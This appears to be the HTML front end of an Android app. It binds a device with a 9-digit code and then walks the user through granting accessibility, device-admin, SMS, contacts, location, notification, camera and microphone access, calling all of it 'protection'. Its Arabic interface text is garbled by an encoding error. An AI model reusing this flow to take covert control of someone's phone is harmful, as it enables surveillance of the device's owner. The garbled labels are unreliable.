<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
    <style>
        body{font-family:'Tajawal',sans-serif;background-color:#0F172A;color:#fff}
        .screen{display:none;position:fixed;inset:0;flex-direction:column}
        .screen.active{display:flex}
        /* ุชูุณูู ุฌุฏูุฏ ูุฎุงูุงุช ุงูููุฏ ูุถูุงู ูุถูุญ ุงูุฑูู */
        .code-input{
            width:32px;
            height:42px;
            text-align:center;
            font-size:20px;
            font-weight:bold;
            border:2px solid #CBD5E1;
            border-radius:8px;
            outline:none;
            margin:2px;
            color:#1F2937; /* ููู ุงูุฎุท ุฃุณูุฏ */
            background-color:#FFFFFF; /* ุฎูููุฉ ุจูุถุงุก */
            direction:ltr; /* ููู ุชุธูุฑ ุงูุฃุฑูุงู ูู ุงููุณุงุฑ ูููููู */
        }
    </style>
</head>
<body>
    <!-- 1. ุดุงุดุฉ ุฅุฏุฎุงู ุงูููุฏ -->
    <div id="screen-binding" class="screen active items-center justify-center bg-white">
        <div class="w-full max-w-sm text-center p-6">
            <div class="w-16 h-16 bg-blue-100 rounded-full mx-auto mb-4 flex items-center justify-center">
                <span class="text-3xl">๐</span>
            </div>
            <h2 class="text-xl font-bold text-gray-800 mb-2">ุฅุฏุฎุงู ุฑูุฒ ุงูุฑุจุท</h2>
            <p class="text-gray-500 text-sm mb-6">ุฃุฏุฎู ุงูุฑูุฒ ุงููููู ูู 9 ุฃุฑูุงู</p>
            
            <div id="code-container" class="flex justify-center mb-4"></div>

            <button id="btn-confirm" onclick="confirmBinding()" disabled class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold opacity-50">ุฑุจุท ุงูุฌูุงุฒ</button>
            <p id="error-msg" class="text-red-500 text-xs mt-2 hidden"></p>
        </div>
    </div>

    <!-- 2. ุดุงุดุฉ ุงูุฃุฐููุงุช ุงููุงููุฉ -->
    <div id="screen-permissions" class="screen bg-gray-100">
        <div class="bg-white p-4 border-b shadow-sm sticky top-0 z-10">
            <h2 class="text-lg font-bold text-center text-gray-800">ุฅุนุฏุงุฏ ุตูุงุญูุงุช ุงููุธุงู</h2>
            <p class="text-gray-500 text-xs text-center">ูุทููุจุฉ ูุนูู ุงูุญูุงูุฉ ุจุดูู ูุงูู</p>
        </div>
        <div class="flex-1 overflow-y-auto p-4 space-y-4">
            
            <!-- ูุณู ุญุฏูุฏ ุงูุงุณุชุฎุฏุงู -->
            <div class="bg-white rounded-xl p-4 shadow-sm">
                <h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                    <span class="w-6 h-6 bg-red-100 text-red-500 rounded-full flex items-center justify-center text-xs">1</span>
                    ุญุฏูุฏ ุงูุงุณุชุฎุฏุงู
                </h3>
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุฎุฏูุฉ ุงููุตูู (Accessibility)</span>
                        <button onclick="togglePerm('accessibility')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงูุนุฑุถ ููู ุงูุชุทุจููุงุช</span>
                        <button onclick="togglePerm('overlay')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                </div>
            </div>

            <!-- ูุณู ูุดุงุท ุงูุฌูุงุฒ -->
            <div class="bg-white rounded-xl p-4 shadow-sm">
                <h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                    <span class="w-6 h-6 bg-blue-100 text-blue-500 rounded-full flex items-center justify-center text-xs">2</span>
                    ูุดุงุท ุงูุฌูุงุฒ
                </h3>
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุฅุญุตุงุฆูุงุช ุงูุงุณุชุฎุฏุงู</span>
                        <button onclick="togglePerm('usage')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                </div>
            </div>

            <!-- ูุณู ุงููููุน -->
            <div class="bg-white rounded-xl p-4 shadow-sm">
                <h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                    <span class="w-6 h-6 bg-green-100 text-green-500 rounded-full flex items-center justify-center text-xs">3</span>
                    ูุชุชุจุน ุงููููุน
                </h3>
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงููููุน ุงูุฌุบุฑุงูู</span>
                        <button onclick="togglePerm('location')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                </div>
            </div>

            <!-- ูุณู ุงูุฅุดุนุงุฑุงุช -->
            <div class="bg-white rounded-xl p-4 shadow-sm">
                <h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                    <span class="w-6 h-6 bg-yellow-100 text-yellow-500 rounded-full flex items-center justify-center text-xs">4</span>
                    ูุฒุงููุฉ ุงูุฅุดุนุงุฑุงุช
                </h3>
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงููุตูู ููุฅุดุนุงุฑุงุช</span>
                        <button onclick="togglePerm('notification')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                </div>
            </div>

            <!-- ูุณู ุงูุญูุงูุฉ ุงููุชูุฏูุฉ -->
            <div class="bg-white rounded-xl p-4 shadow-sm">
                <h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                    <span class="w-6 h-6 bg-purple-100 text-purple-500 rounded-full flex items-center justify-center text-xs">5</span>
                    ุงูุญูุงูุฉ ุงููุชูุฏูุฉ
                </h3>
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ูุณุคูู ุงูุฌูุงุฒ (Device Admin)</span>
                        <button onclick="togglePerm('admin')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุฌูุงุช ุงูุงุชุตุงู</span>
                        <button onclick="togglePerm('contacts')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงูุฑุณุงุฆู SMS</span>
                        <button onclick="togglePerm('sms')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                </div>
            </div>

            <!-- ูุณู ุงููุณุงุฆุท -->
            <div class="bg-white rounded-xl p-4 shadow-sm">
                <h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                    <span class="w-6 h-6 bg-pink-100 text-pink-500 rounded-full flex items-center justify-center text-xs">6</span>
                    ุงููุณุงุฆุท ูุงููุดู
                </h3>
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงููุงููุฑุง</span>
                        <button onclick="togglePerm('camera')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงููููุฑูููู</span>
                        <button onclick="togglePerm('microphone')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">ุงูุตูุฑ ูุงูููุฏูู</span>
                        <button onclick="togglePerm('storage')" class="px-3 py-1 bg-gray-200 text-gray-600 text-xs rounded-lg font-bold">ุชูุนูู</button>
                    </div>
                </div>
            </div>

        </div>
        <div class="p-4 bg-white border-t sticky bottom-0">
            <button onclick="finishSetup()" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold shadow-lg">ุชูุ ุงุจุฏุฃ ุงูุญูุงูุฉ</button>
        </div>
    </div>

    <!-- 3. ุดุงุดุฉ ุงููุฌุงุญ -->
    <div id="screen-success" class="screen items-center justify-center bg-green-50 p-6">
        <div class="text-center">
            <div class="w-20 h-20 bg-green-500 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg">
                <span class="text-4xl text-white">โ</span>
            </div>
            <h2 class="text-2xl font-bold text-gray-800 mb-2">ุชู ุจูุฌุงุญ!</h2>
            <p class="text-gray-600 text-sm mb-6">ุงูุฌูุงุฒ ูุฑุจูุท ููุญูู ุงูุขู.</p>
        </div>
    </div>

    <script>
        // Logic
        function showScreen(id){ document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
        function callNative(fn, arg){ if(typeof AndroidNative!=='undefined'){ arg ? AndroidNative[fn](arg) : AndroidNative[fn](); } }

        // Code Inputs - ุชู ุชุตุญูุญ ุงูููุฏ ููุง ูุธููุฑ ุงูุฃุฑูุงู
        const codeContainer = document.getElementById('code-container');
        for(let i=0; i<9; i++){
            let input = document.createElement('input');
            input.type = 'number';
            input.maxLength = 1;
            // ุชุทุจูู ุงูุณุชุงูู ุงููุตุญุญ
            input.className = 'code-input'; 
            input.oninput = (e) => handleCodeInput(e, i);
            codeContainer.appendChild(input);
        }

        function handleCodeInput(e, index) {
            const inputs = codeContainer.getElementsByTagName('input');
            if(e.target.value.length === 1 && index < 8) inputs[index+1].focus();
            checkCodeComplete();
        }

        function checkCodeComplete() {
            const inputs = codeContainer.getElementsByTagName('input');
            let code = ""; for(let inp of inputs) code += inp.value;
            const btn = document.getElementById('btn-confirm');
            if(code.length === 9) { btn.disabled = false; btn.classList.remove('opacity-50'); }
            else { btn.disabled = true; btn.classList.add('opacity-50'); }
        }

        function confirmBinding() {
            const inputs = codeContainer.getElementsByTagName('input');
            let code = ""; for(let inp of inputs) code += inp.value;
            document.getElementById('error-msg').classList.add('hidden');
            callNative('linkDevice', code);
        }

        function togglePerm(type){ callNative('requestPermission', type); }
        function finishSetup(){ callNative('startServices'); showScreen('screen-success'); }

        // Native Callbacks
        window.onLinkSuccess = function(){ showScreen('screen-permissions'); };
        window.onLinkError = function(msg){ 
            document.getElementById('error-msg').innerText = msg; 
            document.getElementById('error-msg').classList.remove('hidden'); 
        };
    </script>
</body>
</html>
